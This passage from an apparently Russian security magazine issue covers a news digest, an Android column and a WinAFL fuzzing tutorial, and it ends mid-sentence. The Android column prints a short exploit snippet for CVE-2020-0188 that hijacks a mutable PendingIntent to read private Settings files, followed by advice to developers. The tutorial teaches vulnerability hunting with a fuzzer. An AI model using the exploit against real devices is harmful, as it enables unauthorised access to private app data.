   из девяти отраслей: финансовой, промышленной, государственного сектора, ТЭК, образова‐
   ния, телекоммуникаций, здравоохранения, СМИ и IT. В каждой сфере были обнаружены орга‐
   низации, которые подвергались целенаправленным атакам.

   Чаще всего жертвами становились финансовые компании ― 44% случаев, на втором месте
   оказались предприятия топливно‑энергетического комплекса ― 33%, замыкают тройку госуч‐
   реждения ― 29% случаев.





   Большинство целевых атак были направлены на конкретную компанию, отрасль или группу лиц.
   Как правило, такие атаки проводят после предварительной разведки и сбора информации
   о жертве.





    Исследователи отмечают, что большинство организаций практически не защищены от подоб‐
   ных угроз: они используют лишь базовые средства защиты, а у некоторых нет даже антивиру‐
   сов.

    Песочницы, которые проверяют файлы в изолированной виртуальной среде, есть у 28% опро‐
   шенных, системы глубокого анализа трафика (NTA) ― у 27%. Специализированные ком‐
   плексные решения используют только 15% респондентов.





 У GODADDY СНОВА
 ПРОБЛЕМЫ
   Доменный регистратор и хостер GoDaddy сообщил о взломе и утечке данных.
  В ходе инцидента пострадали данные 1,2 миллиона клиентов компании, так
   как хакеры получили доступ к хостинговой среде WordPress. Компания сооб‐
  щила о произошедшем в документах, поданных в Комиссию по ценным
  бумагам и биржам США. Специалисты GoDaddy обнаружили взлом 17 нояб‐
   ря, после «подозрительной активности», зафиксированной в среде управля‐
   емого хостинга для WordPress.
      Расследование показало, что неизвестные хакеры сохраняли доступ к сер‐
  верам GoDaddy более двух месяцев и проникли в сеть компании еще 6 сен‐
  тября 2021 года. Злоумышленники имели доступ к следующим данным:
   • информации 1,2 миллиона активных и неактивных клиентов управляемого
      хостинга для WordPress, включая адреса электронной почты и номера кли‐
      ентов;
   • оригинальному паролю администратора WordPress (его GoDaddy выдает
      клиентам при создании сайта);
   • именам пользователей и паролям от БД и sFTP для активных клиентов;
   • закрытым ключам SSL для некоторых клиентов.

   Представители GoDaddy  говорят,  что  сбросили  скомпрометированные
  во время взлома пароли для sFTP и БД. Также компания обнулила пароли
   от учетных записей администратора, если клиенты все еще использовали
  пароль по умолчанию, выданный им в самом начале. Кроме того, компания
   инициировала перевыпуск и установку новых сертификатов SSL для постра‐
   давших.
      Напомню, что это далеко не первый случай компрометации ресурсов
  GoDaddy. К примеру, в 2019 году хакеры разместили в инфраструктуре ком‐
  пании более 15 тысяч вредоносных поддоменов, которые перенаправляли
   посетителей на сайты, где рекламировались БАДы для улучшения работы
   мозга, таблетки для похудения, CBD-масла и подобное.


  БРУТФОРС ПАРОЛЕЙ
   Специалист компании Microsoft Росс Бевингтон (Ross Bevington) поделился интересной статис‐
   тикой: большинство злоумышленников предпочитают брутфорсить только короткие пароли
   и лишь малый процент атак нацелен на длинные пароли, содержащие специальные символы.

   Данные, использованные более чем в 25 000 000 брутфорс‑атак на SSH, показали, что в 77%
    случаев брутфорс был направлен на пароли от 1 до 7 символов. Пароль длиной более 10 сим‐
   волов встречался только в 6% случаев.

   К тому же лишь в 7% случаев во время брутфорс‑атак использовался хотя бы один специаль‐
   ный символ, тогда как в 39% случаев использовалась хотя бы одна цифра. При этом ни одна
   из попыток брутфорса не учитывала пароли, которые могут содержать пробелы.

    Бевингтон  отметил,  что, основываясь на данных, полученных из 14 миллиардов  брут‐
   форс‑атак на honeypot-серверы Microsoft, атаки на RDP утроились по сравнению с 2020 годом,
   продемонстрировав рост на 325%.





 ОТМЫВАНИЕ ДЕНЕГ
 ЧЕРЕЗ TWITCH
   Изучая данные, опубликованные хакерами после недавней компрометации
   Twitch, журналисты обнаружили схему по отмыванию денег через сервис.
   Средства проходят через турецких стримеров в формате пожертвований.


  УТЕЧКА
  В октябре 2021 года на 4chan была опубликована ссылка на торрент‑файл, содержащий поч‐
   ти 130 Гбайт данных компании Twitch. Неизвестные хакеры выложили в открытый доступ
   исходные коды и бизнес‑данные платформы.
       Компания Twitch подтвердила факт взлома и заявила, что слив произошел из‑за изменения
   конфигурации сервера. Подчеркивалось, что в результате инцидента не пострадали ни пароли
    пользователей, ни их номера банковских карт. Зато достоянием общественности стали данные
   о доходах стримеров.


   Журналисты изданий MEE и Gamegar изучили похищенные у Twitch данные,
   относящиеся к турецкому рынку, и информация показалась им странной: они
   заметили, что крупные пожертвования порой делаются небольшими сум‐
  мами, разбиваясь на множество мелких платежей. В основном в таких схемах
   используется собственная валюта платформы — Bits.


          «Twitch  переводит один  процент  дохода,  полученного через  Bits,
         отдельным  стримерам. Было  установлено,  что  некоторые из них «
          зарабатывают  до  1800  долларов  в  день,  хотя  у  них   всего
         от 40 до 50 зрителей.
         В рамках этой схемы хакеры сначала похищали или иным образом
          получали информацию о кредитных картах случайных людей, а затем
         заключали сделки со стримерами Twitch, чтобы отправлять им круп-
        ные денежные выплаты через Bits.
         [Получив такие пожертвования], стримеры возвращали 80% получен-
        ных денег на различные банковские счета, принадлежащие хакерам,
         эффективно отмывая эти деньги.
          За последние два года через 2400 турецких стримеров было отмы-
         то порядка 9,8 миллиона долларов», — рассказывают исследователи.                 »
   Интересно, что слухи об этой схеме циркулировали давно, однако детали ста‐
  ли известны лишь недавно,  когда турецкий стример Grimnax поделился
  скриншотами из Discord, на которых видно, как хакеры предлагают ему при‐
   нять участие в их афере.





   Другой известный турецкий стример, Jahrein, у которого более 1,7 миллиона
   подписчиков, тоже пытается привлечь внимание к этой проблеме. Недавно он
   встречался с политиками, которые теперь призывают парламент Турции
  и регулирующие органы заняться тщательным изучением этого скандала.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

  Аресты


   Интерпол сообщил об аресте 1000 человек, связанных с киберпреступностью


   Власти США арестовали взломщика компании Kaseya, а также хакеров, связанных с REvil
   и GandCrab


    Глава двух криптовалютных бирж задержан, так как помогал операторам малвари Ryuk


  Взломы


    Владельца пиратского сайта обвинили во взломе MLB, НБА, НФЛ, НХЛ, а также в вымогатель‐
   стве


   Неизвестные взломали чат‑бота на портале Госуслуг


   Платформа Robinhood скомпрометирована. Украдены данные примерно семи миллионов поль‐
   зователей


  Малварь


    Ботнет Pink заразил более 1 600 000 устройств


   Шифровальщик BlackMatter прекратил работу из‑за «давления властей»


   Малварь из каталога AppGallery проникла по меньшей мере на 9 300 000 Android-устройств


  Уязвимости


   Хакеры эксплуатируют критическую RCE-уязвимость в GitLab


   Опубликован эксплоит для проблем BrakTooth


   Проблемы NUCLEUS:13 угрожают медицинским устройствам, автомобилям и промышленным
   системам


  Интересное


    Эксперты обманули сканер отпечатков пальцев с помощью клея


   На Pwn2Own принтеры заставили играть AC/DC


   Большинство предложений о взломе SS7 — это скам
HEADER
ANDROID





     УЯЗВИМОСТИ PENDINGINTENT
     И ТРЕКИНГОВЫЕ БИБЛИОТЕКИ




В этом выпуске: анализ использования тре‐
кинговых библиотек в приложениях, рас‐
сказ об уязвимостях, связанных с исполь‐
зованием PendingIntent, статьи о правиль‐
ном завершении и синхронизации корутин,          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
а также статья о неочевидных тонкостях              zobnin@glc.ru
работы с объектами. Ну и как всегда —
подборка библиотек для разработчиков.


                ПОЧИТАТЬ


PendingIntent и безопасность
Re-route Your Intent for Privilege Escalation — презентация с Black Hat Europe
2021, посвященная уязвимостям, связанным с использованием так называ‐
емых PendingIntent в приложениях для Android.
   Интенты (intent) — одна из ключевых идей Android. Интенты позволяют
пересылать сообщения между компонентами приложений и системных сер‐
висов с целью вызвать определенное действие. Запускаются приложения,
открываются ссылки, инициируются звонки и многое другое в Android дела‐
ется с помощью интентов.
   Поверх интентов  построен  другой механизм — отложенные интенты
(PendingIntent). Он позволяет передать интент другому приложению или ком‐
поненту системы, чтобы то могло отправить интент от имени передавшего его
приложения.
   Проблема отложенных интентов только в том, что в ряде случаев можно
изменить записанный в них интент (это можно сделать, если не установлен
флаг FLAG_IMMUTABLE) и в итоге выполнить произвольное действие от имени
передавшего PendingIntent приложения.
   Отложенные интенты чаще всего используются в следующих компонентах:
 1. Уведомления.    Чтобы    перехватить    их,   мы   можем    создать
  NotificationListenerService, который будет слушать все уведом‐
   ления приложений и извлекать из них отложенные интенты.
 2. SliceProvider. Этот механизм используется для встраивания частей при‐
   ложения в другие приложения, например встраивания переключателя
   быстрых  настроек  в  окно  ассистента. Мы можем  получить  слайс
   с помощью класса SliceViewManager или ContentResolver и затем
   получить PendingIntent всех слайсов.
 3. MediaBrowserService. Механизм, позволяющий приложению дать доступ
   к своей медиатеке с возможностью включить проигрывание медиафайлов.
   Получить PendingIntent можно, подключившись к приложению с помощью
   класса MediaBrowser.
 4. Виджеты рабочего стола используют отложенные интенты в качестве дей‐
   ствий при нажатии на свои элементы. Класс AppWidgetHost позволяет
   приложению прикинуться лаунчером и получить доступ к виджетам при‐
   ложений. Далее PendingIntent можно извлечь из самого виджета.

В качестве примера уязвимости в одном из этих компонентов приведем CVE-
2020-0188. Это уязвимость в SliceProvider’е стандартных настроек Android.
Благодаря тому что PendingIntent был открыт для изменения, его можно было
вытащить с помощью ContentResolver, а затем изменить так, чтобы про‐
читать приватные файлы приложения «Настройки»:


Intent hijackIntent = new Intent();
hijackIntent.setPackage(getPackageName());
hijackIntent.setDataAndType(Uri.parse("content://com.android.
settings.files/my_cache/NOTICE.html") , "txt/html");
hijackIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION |
Intent.FLAG_GRANT_READ_URI_PERMISSION);
pi.send(getApplicationContext(), 0, hijackIntent, null, null);

По сути, этот код  заставляет приложение «Настройки» передать ссылку
на свой внутренний файл с правами на чтение и запись приложению‑экспло‐
иту. Остается только принять интент, и можно делать с файлом все, что угод‐
но.
   Рекомендации разработчикам:
 • По  возможности  указывай  флаг  FLAG_IMMUTABLE  при  создании
   PendingIntent.
 • При необходимости использовать модифицируемый PendingIntent при‐
   меняй явный интент и заполняй поле ComponetName. В этом случае зло‐
   умышленник не сможет перенаправить интент.
 • Используй  утилиту  PendingIntentScan  для  сканирования  приложения
   на наличие модифицируемых PendingIntent.


Анализ использования трекинговых библиотек в приложениях
Are iPhones Really Better for Privacy? Comparative Study of iOS and Android
Apps — исследование использования трекинговых библиотек в приложениях
для Android и iOS. Авторы работы взяли 12 тысяч приложений для каждой
платформы, проанализировали их код и сетевые подключения и пришли
к следующим выводам:
 • В среднем приложения используют около трех различных трекинговых
   библиотек.
 • 3,73% приложений для Android и 3,13% приложений для iOS используют
   больше десяти трекинговых библиотек.
 • 88,73% приложений для Android и 79,35% приложений для iOS содержат
   хотя бы одну трекинговую библиотеку.
 • Самые популярные трекинговые библиотеки на Android — Google Play
   Services (87,3%), Google AdMob (61,7%), Google Firebase (57,6%).
 • Самые популярные  трекинговые  библиотеки на iOS — SKAdNetwork
   (69,6%), Google Firebase (53,9%), Facebook (25,5%).
 • Самые используемые разрешения в приложениях для Android (исключая
   те, что даются без запроса пользователя) — доступ к карте памяти, мес‐
   тоположению и камере.
 • Самые используемые разрешения в приложениях для iOS — хранилище
   фотографий, камера, местоположение.
 • Самые    популярные   домены   для    отправки    статистики  —
   googleads.g.doubleclick.net (Android) и app-measurement.com (iOS).
 • Большая часть  трекинговых компаний принадлежит Alphabet (Google)
   и Facebook.





       Сравнительная таблица использования трекинговых библиотек





                  Самые запрашиваемые разрешения


              РАЗРАБОТЧИКУ


Синхронизация корутин
Coroutines and Java Synchronization Don’t Mix — небольшая заметка о неоче‐
видной для некоторых программистов особенности взаимодействия корутин
Kotlin и блокировок.
  Все мы знаем об аннотации @Synchronized (или блоке synchronized),
которая говорит о том, что код функции может выполняться только в одном
потоке одновременно:


repeat( 2) {
    thread { criticalSection() }
}


@Synchronized
fun criticalSection() {
    println("Starting!")
    Thread.sleep( 10)
    println("Ending!")
}

Два потока в этом примере выполнят код функции последовательно, один
за другим:


Starting!
Ending!
Starting!
Ending!

Однако если мы заменим потоки корутинами, то все изменится:


val scope = CoroutineScope( Job())


repeat( 2) {
    scope.launch { criticalSectionSuspending() }
}


@Synchronized
suspend fun criticalSectionSuspending() {
    println("Starting!")
    delay( 10)
    println("Ending!")
}

Вывод будет таким:


Starting!
Starting!
Ending!
Ending!

Другими словами, аннотация @Synchronized будто бы не работает в случае
корутин.
  На самом деле объяснение в том, что обе корутины в данном примере
работают в одном потоке. А это влечет за собой два следствия:
 1. Компилятор, поняв, что в synchronized-блок входит только один поток,
  может полностью удалить синхронизацию.
 2. Блок synchronized обладает свойством reentrace, когда один и тот же поток
  может заходить в synchronized-блок, не снимая блокировку.

Другими словами, @Synchronized просто не имеет смысла для корутин,
работающих в одном потоке. И вместо нее следует использовать класс
Mutex.


Правила обращения с объектами
Variables point to objects — очевидная для многих и в то же время неочевидная
для некоторых даже прожженных программистов заметка о том, как происхо‐
дит работа с переменными и объектами.
   Возьмем следующий пример:


var a = 10
var b = a
a = 20
println( b)

Очевидно, что этот код напечатает 10. Мы присваиваем переменной b ссылку
на объект a, который имеет значение 10 (в Kotlin примитивные типы тоже
представлены  объектами), а затем присваиваем переменной a  ссылку
на объект со значением 20. Соответственно, a теперь ссылается на объ‐
ект 20, а b продолжает ссылаться на объект 10. Все логично.
   Картина  становится немного  сложнее,  когда мы начинаем работать
с изменяемыми объектами:


val user1 = object {
    var name: String = "Rafał"
}
val user2 = user1
user1.name = "Bartek"
println(user2.name)

Этот код напечатает Bartek, потому что, в отличие от предыдущего примера,
переменные user1 и user2 продолжают ссылаться на один и тот же объект.
А вот свойства этого объекта меняются, и изменение распространяется
на обе переменные.
  Все становится совсем запутанным, когда мы переходим к изменяемым
и неизменяемым коллекциям. Вот два примера.
   Первый:


var list1 = listOf( 1,2,3)
var list2 = list1
list1 += 4
println( list2)

Второй:


var list1 = mutableListOf( 1,2,3)
var list2 = list1
list1 += 4
println( list2)

Первый печатает [1, 2, 3], а второй — [1, 2, 3, 4]. Так происходит
потому, что в первом случае мы работаем с неизменяемой коллекцией, в ито‐
ге код list1 += 4 превращается в list1 = list1 + 4, что буквально озна‐
чает «создать новый объект‑список, содержимым которого будут все элемен‐
ты первого списка плюс элемент 4».
  Во втором примере тот же самый код превратится уже в другую конструк‐
цию:  list1.plusAssign(4),  которая  означает  list1.add(4),  то  есть
«добавить элемент 4 к уже существующему объекту‑коллекции».
  И наконец, самый интересный пример. Kotlin позволяет делегировать поля
отображению. Например:


class Population(var cities: Map<String, Int>) {
   val sanFrancisco by cities
   val tallinn by cities
   val kotlin by cities
}


val population = Population( mapOf(
     "sanFrancisco" to 864_816,
     "tallinn" to 413_782,
     "kotlin" to 43_005)
)


println(population.sanFrancisco) // 864816
println(population.tallinn) // 413782
println(population.kotlin) // 43005

Функция весьма удобная. Но что, если после создания объекта мы присвоим
полю cities значение emptyMap()?


population.cities = emptyMap()

Какие  значения в этом  случае  будут  у полей sanFrancisco, tallinn
и kotlin? Ответ: те же самые. Просто потому, что объект population про‐
должает ссылаться на предыдущую версию map со всеми ее элементами.


Как правильно завершать корутины
Cancellation in Kotlin Coroutines — большая статья о том, как в Kotlin устроено
завершение корутин.
   Итак, начнем с того, что интерфейс Job, представляющий корутину, имеет
метод cancel(), предназначенный для завершения корутины. Его вызов при‐
водит к следующему:
 • Корутина завершается на первой точке остановки, то есть когда происхо‐
   дит вызов какой‑то стандартной suspend-функции из стандартной биб‐
   лиотеки корутин (в случае с примером ниже эта точка — метод delay()).
 • Если Job имеет потомков, то они тоже будут завершены.
 • Когда Job будет завершена, она больше не может быть использована
   для запуска новых корутин (состояние Cancelled).


fun main() = runBlocking {
    val job = launch {
        repeat( 1_000) { i ->
            delay( 200)
            println("Printing $i")
        }
    }


    delay( 1100)
    job.cancel()
    job.join()
    println("Cancelled successfully")
}
// Printing 0
// Printing 1
// Printing 2
// Printing 3
// Printing 4
// Cancelled successfully

Как и в этом примере, зачастую после job.cancel() следует использовать
job.join(), чтобы дождаться фактического завершения. Это настолько час‐
тая потребность, что библиотека поддержки корутин включает в себя фун‐
кцию‑расширение cancelAndJoin().
   Когда Job получает сигнал завершения, она меняет свое состояние
на Cancelling. Затем, при переходе в следующую точку остановки, она выб‐
расывает  исключение CancellationException. Это  исключение  можно
перехватить, но, чтобы избежать трудноуловимых багов, его лучше сразу выб‐
росить снова:


suspend fun main(): Unit = coroutineScope {
    val job = Job()
    launch( job) {
        try {
            repeat( 1_000) { i ->
                delay( 200)
                println("Printing $i")
            }
        } catch (e: CancellationException) {
            println( e)
            throw e
        }
    }
    delay( 1100)
    job.cancelAndJoin()
    println("Cancelled successfully")
    delay( 1000)
}
// Printing 0
// Printing 1
// Printing 2
// Printing 3
// Printing 4
// JobCancellationException...
// Cancelled successfully

Благодаря тому что завершение корутины приводит к выбросу исключения,
мы можем использовать блок finally, чтобы корректно закрыть все исполь‐
зуемые корутиной ресурсы (базы данных, файлы, сетевые соединения).
Однако мы уже не сможем в этом  блоке  запускать  другие  корутины
или вызывать  suspend-функции. Эти  действия  будут запрещены  после
перехода корутины в состояние Cancelling. Единственный выход из этой
ситуации — использовать блок withContext(NonCancellable), который
позволит вызвать suspend-функции, но не будет реагировать на сигнал
завершения:


launch( job) {
    try {
        delay( 200)
        println("Coroutine finished")
    } finally {
        println("Finally")
        withContext(NonCancellable) {
            delay( 1000L)
            println("Cleanup done")
        }
    }
}

Еще один способ выполнить код после завершения корутины — это метод
invokeOnCompletion(), который будет вызван независимо от того, как была
завершена корутина — принудительно или она просто отработала свое вре‐
мя.


suspend fun main(): Unit = coroutineScope {
    val job = launch {
        delay( 1000)
    }
    job.invokeOnCompletion { exception: Throwable? ->
        println("Finished")
    }
    delay( 400)
    job.cancelAndJoin()
}
// Finished

Завершение корутины происходит в точках остановки. Но что делать, если
в коде корутины нет точек остановки (нет вызовов suspend-функций)?
  Один из вариантов — использовать функцию yield(). Эта suspend-фун‐
кция приостановит корутину и тут же ее возобновит, но по пути обработает
сигнал завершения. Второй вариант: Boolean-поле isActive, достаточно
просто проверить его значение и, если оно равно false, закончить работу
внутри корутины. Еще один вариант — вызвать функцию ensureActive().
Она выбросит исключение CancellationException, если  корутина уже
получила сигнал завершения.


              БИБЛИОТЕКИ


 • IconKitchen — веб‑генератор иконок для приложений;
 • Simple Stack — очередная библиотека для управления навигацией;
 • Customizable OkHttp Logging Interceptor — okHttp-логгер;
 • Gadget — обертка для удобной работы с библиотеками аналитики;
 • Swipeable-Card — карточки со смахиванием для Jetpack Compose;
 • Pathway — набор функций‑расширений для класса Path;
 • Compose-sliders — набор слайдеров для Jetpack Compose;
 • Abc-kmm-location — кросс‑платформенная библиотека для получения
   местоположения;
 • Kotlin-math — библиотека математических функций в стиле GLSL;
 • PasswordValidationView — анимированный View для валидации паролей;
 • Contacts-android — библиотека для работы с системными контактами;
 • Kover — Gradle-плагин для оценки покрытия кода Kotlin тестами;
 • Spruce — библиотека для удобной анимации.
 COVERSTORY





  Вячеслав Москвин
moskvin.slava@gmail.com



WINAFL
НА ПРАКТИКЕ
 УЧИМСЯ РАБОТАТЬ ФАЗЗЕРОМ
 И ИСКАТЬ ДЫРЫ В СОФТЕ




 WinAFL — это форк знаменитого фаззера AFL, предназна‐
 ченный для фаззинга программ с закрытым исходным кодом
 под Windows. Работа WinAFL  описана  в  документации,
 но пройти путь от загрузки тулзы до успешного фаззинга
 и первых крашей не так  просто, как может показаться
 на первый взгляд.


 Что такое фаззинг
 Если ты совсем незнаком с этой техникой поиска уязвимостей, то можешь
 обратиться к одной из наших вводных статей:
  • «Фаззинг, фаззить, фаззер: ищем уязвимости в программах, сетевых сер‐
    висах, драйверах»
  • «Luke, I am your fuzzer. Автоматизируем поиск уязвимостей в программах»

 Также по теме фаззинга рекомендуем следующие статьи:
  • «Фаззинг глазами программиста. Как в Google автоматизируют поиск
    багов»
  • «Распуши пингвина! Разбираем способы фаззинга ядра Linux»



 Так же как и AFL, WinAFL собирает информацию о покрытии кода. Делать
 это он может тремя способами:
  • динамическая инструментация с помощью DynamoRIO;
  • статическая инструментация с помощью Syzygy;
  • трейсинг с помощью IntelPT.

 Мы остановимся на классическом первом варианте как самом простом
 и понятном.
    Фаззит WinAFL следующим образом:
  1. В качестве одного из аргументов ты должен передать смещение так
    называемой целевой функции внутри бинаря.
  2. WinAFL инжектится в программу и ждет, пока не начнет выполнятся
    целевая функция.
  3. WinAFL начинает записывать информацию о покрытии кода.
  4. Во время выхода из целевой функции WinAFL приостанавливает работу
    программы, подменяет входной файл, перезаписывает RIP/EIP адресом
    начала функции и продолжает работу.
  5. Когда число таких итераций достигнет некоторого максимального зна‐
    чения (его ты определяешь сам), WinAFL полностью перезапускает прог‐
    рамму.

 Такой подход позволяет не тратить лишнее время на запуск и инициализацию
 программы и значительно увеличить скорость фаззинга.


 ТРЕБОВАНИЯ К ФУНКЦИИ
 Из логики работы WinAFL вытекают простые требования к целевой функции
 для фаззинга. Целевая функция должна:
  1. Открывать входной файл.
  2. Парсить файл и завершать свою работу максимально чисто: закрывать
    файл и все открытые хендлы, не менять глобальные переменные и так
    далее. В реальности не всегда получается найти идеальную функцию пар‐
    синга, но об этом поговорим позже.
  3. Выполнение  должно  доходить до  возврата  из  функции,  выбранной
    для фаззинга.


 КОМПИЛЯЦИЯ WINAFL
 В репозитории WinAFL на GitHub уже лежат скомпилированные бинари, но у
 меня они просто не захотели работать, поэтому для того, чтобы не пришлось
 разбираться с лишними проблемами, скомпилируем WinAFL вместе с самой
 последней версией DynamoRIO. К счастью, WinAFL относится к тем нем‐
 ногочисленным проектам, которые компилируются без проблем на любой
 машине.
  1. Скачай и установи Visual Studio 2019 Community Edition (при установке
    выбери пункт «Разработка классических приложений на C++».
  2. Пока  у тебя  устанавливается  Visual  Studio,  скачай последний релиз
    DynamoRIO.
  3. Скачай исходники WinAFL из репозитория.
  4. После установки Visual Studio в меню «Пуск» у тебя появятся ярлыки
    для открытия командной строки Visual Studio: x86 Native Tools Command
    Prompt  for VS 2019 и x64 Native Tools Command Prompt  for VS 2019.
    Выбирай в соответствии с битностью программы, которую ты будешь фаз‐
     зить.
  5. В командной строке Visual Studio перейди в папку с исходниками WinAFL.
      Для компиляции 32-битной версии выполни следующие команды:


    mkdir build32
    cd build32
    cmake -G"Visual Studio 16 2019" -A Win32 .. -DDynamoRIO_DIR=..\
    path\to\DynamoRIO\cmake -DINTELPT=0 -DUSE_COLOR=1
    cmake --build . --config Release

    Для компиляции 64-битной версии — такие:


    mkdir build64
    cd build64
    cmake -G"Visual Studio 16 2019" -A x64 .. -DDynamoRIO_DIR=..\path\
    to\DynamoRIO\cmake -DINTELPT=0 -DUSE_COLOR=1
    cmake --build . --config Release

   В моем случае эти команды выглядят так:


    cd C:\winafl_build\winafl-master\
    mkdir build32
    cd build32
    cmake -G"Visual Studio 16 2019" -A Win32 .. -DDynamoRIO_DIR=C:\
    winafl_build\DynamoRIO-Windows-8.0.18915\cmake -DINTELPT=0
    -DUSE_COLOR=1
    cmake --build . --config Release

  6. После компиляции в папке <WinAFL  dir>\build<32/64>\bin\Release
    будут лежать рабочие бинари WinAFL. Скопируй их и папку с DynamoRIO
    на виртуалку, которую будешь использовать для фаззинга.


 ПОИСК ПОДХОДЯЩЕЙ ЦЕЛИ ДЛЯ ФАЗЗИНГА
 AFL создавался для фаззинга программ, которые парсят файлы. Хотя WinAFL
 можно применять для программ, использующих другие способы ввода, путь
 наименьшего сопротивления — это выбор цели, использующей именно фай‐
 лы.
     Если же тебе, как и мне, нравится дополнительный челлендж, ты можешь
 пофаззить сетевые программы. В этом случае тебе придется использовать
 custom_net_fuzzer.dll из состава WinAFL либо писать свою собственную
 обертку.


              INFO

                      К  сожалению,  custom_net_fuzzer  будет
                         работать не так быстро, потому что он отправляет
                        сетевые запросы своей цели, а на их обработку
                         будет тратиться дополнительное время.


 Однако фаззинг сетевых приложений выходит за рамки этой статьи. Оставь
 комментарий, если хочешь отдельную статью на эту тему.
     Таким образом:
  • идеальная цель работает с файлами;
  • принимает путь к файлу как аргумент командной строки;
  • модуль, содержащий функции, который ты хочешь пофаззить, должен быть
    скомпилирован не статически. В противном случае WinAFL будет инстру‐
    ментировать многочисленные библиотечные функции. Это не принесет
    дополнительного результата, но сильно замедлит фаззинг.

 Удивительно, но большинство разработчиков не думают о WinAFL, когда
 пишут свои программы. Поэтому если твоя цель не соответствует этим кри‐
 териям, то ее все равно можно при желании адаптировать к WinAFL.


                                       Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИCOVERSTORY
 WINAFL НА ПРАКТИКЕ

                   УЧИМСЯ РАБОТАТЬ ФАЗЗЕРОМ
                      И ИСКАТЬ ДЫРЫ В СОФТЕ





ПОИСК ФУНКЦИИ ДЛЯ ФАЗЗИНГА ВНУТРИ ПРОГРАММЫ
Мы поговорили об идеальной цели, но реальная может быть от идеала
далека, поэтому для примера я взял программу из старых запасов, которая
собрана статически, а ее основной исполняемый файл занимает 8 Мбайт.
   У нее много всяких возможностей, так что, думаю, ее будет интересно
пофаззить.
  Моя цель принимает на вход файлы, поэтому первое, что сделаем после
загрузки бинаря в IDA Pro, — это найдем функцию CreateFileA в импортах
и посмотрим перекрестные ссылки на нее.





Мы сразу же можем увидеть, что она используется в четырех функциях. Вмес‐
то того чтобы реверсить каждую из них в статике, посмотрим в отладчике,
какая именно функция вызывается для парсинга файла.
   Откроем нашу программу в отладчике  (я обычно использую x64dbg)
и добавим аргумент к командной строке — тестовый файл. Откуда я его взял?
Просто открыл программу, выставил максимальное число опций для докумен‐
та и сохранил его на диск.





Дальше на вкладке Symbols выберем библиотеку kernelbase.dll и поставим
точки останова на экспорты функций CreateFileA и CreateFileW.





Один любопытный момент. «Официально» функции CreateFile* предос‐
тавляются библиотекой kernel32.dll. Но если посмотреть внимательнее, то
это  библиотека  содержит  только  jmp  на  соответствующие  функции
kernelbase.dll.





Я предпочитаю ставить брейки именно на экспорты в соответствующей биб‐
лиотеке. Это застрахует нас от случая, когда мы ошиблись и эти функции
вызывает не основной исполняемый модуль (.exe), а, например, какие‑то
из библиотек нашей цели. Также это полезно, если наша программа захочет
вызвать функцию с помощью GetProcAddress.
   После установки брейк‑пойнтов продолжим выполнение программы и уви‐
дим, как она совершает первый вызов к CreateFileA. Но если мы обратим
внимание на аргументы, то поймем, что наша цель хочет открыть какой‑то
из своих служебных файлов, не наш тестовый файл.





Продолжим выполнение программы, пока не увидим в списке аргументов
путь к нашему тестовому файлу.





Перейдем на вкладку Call Stack и увидим, что CreateFileA вызывается не из
нашей программы, а из функции CFile::Open библиотеки mfc42.





Так как мы только ищем функцию для фаззинга, нам нужно помнить, что она
должна принимать путь к входному файлу, делать что‑то с файлом и завер‐
шать свою работу настолько чисто, насколько это возможно. Поэтому мы
будем подниматься по стеку вызовов, пока не найдем подходящую функцию.
   Скопируем адрес  возврата из CFile::Open  (125ACBB0),  перейдем
по нему в IDA и посмотрим на функцию. Мы сразу же увидим, что эта функция
принимает два аргумента, которые далее используются как аргументы к двум
вызовам CFile::Open.





Судя по прототипам CFile::Open из документации MSDN, наши переменные
a1 и a2 — это пути к файлам. Обрати внимание, что в IDA путь к файлу переда‐
ется функции CFile::Open в качестве второго аргумента, так как использует‐
ся thiscall.


virtual BOOL Open(
    LPCTSTR lpszFileName,
    UINT nOpenFlags,
    CFileException* pError = NULL);


virtual BOOL Open(
    LPCTSTR lpszFileName,
    UINT nOpenFlags,
    CAtlTransactionManager* pTM,
    CFileException* pError = NULL);

Эта функция уже выглядит очень интересно, и стоит постараться рассмотреть
ее подробнее. Для этого я поставлю брейки на начало и конец функции, что‐
бы изучить ее аргументы и понять, что с ними происходит к концу функции.
   Сделав это, перезапустим программу и увидим, что два аргумента —
это пути к нашему тестовому файлу и временному файлу.




Самое время посмотреть на содержимое этих файлов. Судя по содержимому
нашего  тестового  файла, он сжат, зашифрован или каким‑то образом
закодирован.





Временный же файл просто пуст.





Выполним  функцию до  конца и  увидим,  что наш  тестовый файл все
еще зашифрован, а временный файл по‑прежнему пуст. Что ж, убираем точки
останова с этой функции и продолжаем отслеживать вызовы CreateFileA.
Следующее обращение к CreateFileA дает нам такой стек вызовов.





Функция, которая вызывает CFile::Open, оказывается очень похожей на пре‐
дыдущую. Точно так же поставим точки останова в ее начале и конце и пос‐
мотрим, что будет.





Список аргументов этой функции напоминает то, что мы уже видели.





Срабатывает брейк в конце этой функции, и во временном файле мы видим
расшифрованное, а скорее даже разархивированное содержимое тестового
файла.





Таким образом, эта функция разархивирует файл. Поэкспериментировав
с программой, я выяснил, что она принимает на вход как сжатые, так и нес‐
жатые файлы. Нам это на руку — с помощью фаззинга несжатых файлов мы
сможем добиться гораздо более полного покрытия кода и, как следствие,
добраться до более интересных фич.
   Посмотрим, сможем ли мы найти функцию, которая выполняет какие‑то
действия с уже расшифрованным файлом.
  Один из подходов к выбору функции для фаззинга — это поиск функции,
которая одной из первых начинает взаимодействовать с входным файлом.
Двигаясь вверх по стеку вызовов, найдем самую первую функцию, которая
принимает на вход путь к тестовому файлу.




Функция для фаззинга должна выполняться до конца, поэтому ставим точку
останова на конец функции, чтобы быть уверенными, что это требование
выполнится, и жмем F9 в отладчике.




Также убедимся, что эта функция после возврата закрывает все открытые
файлы. Для этого проверим список хендлов процесса в Process Explorer —
нашего тестового файла там нет.





Видим, что наша функция соответствует требованиям WinAFL. Попробуем
начать фаззить!


АРГУМЕНТЫ WINAFL, ПОДВОДНЫЕ КАМНИ
Мои  аргументы  для WinAFL  выглядят  примерно  так. Давай  разберем
по порядку самые важные из них.


afl-fuzz.exe -i c:\inputs -o c:\winafl_build\out-plain -D C:\
winafl_build\DynamoRIO-Windows-8.0.18915\bin32 -t 40000 -x C:\
winafl_build\test.dict -f test.test -- -coverage_module target.exe
-fuzz_iterations 1000 -target_module target.exe -target_offset
0xA4390 -nargs 3 -call_convention thiscall -- "C:\Program Files (
x86)\target.exe" "@@"

Все аргументы делятся на три группы, которые отделяются друг от друга дву‐
